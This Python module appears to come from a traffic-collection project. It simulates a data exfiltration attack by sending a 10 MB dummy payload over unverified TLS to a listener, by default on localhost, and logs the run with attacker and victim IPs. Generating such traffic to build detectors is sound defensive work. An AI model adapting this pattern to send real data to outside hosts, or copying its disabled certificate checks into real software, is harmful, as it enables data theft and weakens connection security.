"""Data exfiltration attack (§5.5.3). Large/unusual outbound transfer to a listener."""

import socket
import ssl
from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, run_attack,
)


def build_payload(size_bytes: int) -> bytes:
    return b"X" * size_bytes


def _send(host: str, port: int, payload: bytes) -> None:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as tls_sock:
            request = (
                f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {len(payload)}\r\n\r\n"
            ).encode("ascii") + payload
            tls_sock.sendall(request)


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    listener_host: str = "127.0.0.1",
    listener_port: int = 8443,
    size_bytes: int = 10_000_000,
    dry_run: bool = False,
) -> AttackRecord:
    params = {"listener_host": listener_host, "listener_port": listener_port, "size_bytes": size_bytes}

    def body():
        payload = build_payload(size_bytes)
        _send(listener_host, listener_port, payload)

    return run_attack("exfiltration", "python-ssl", attacker_ip, victim_ip, out_dir, params, body, dry_run)
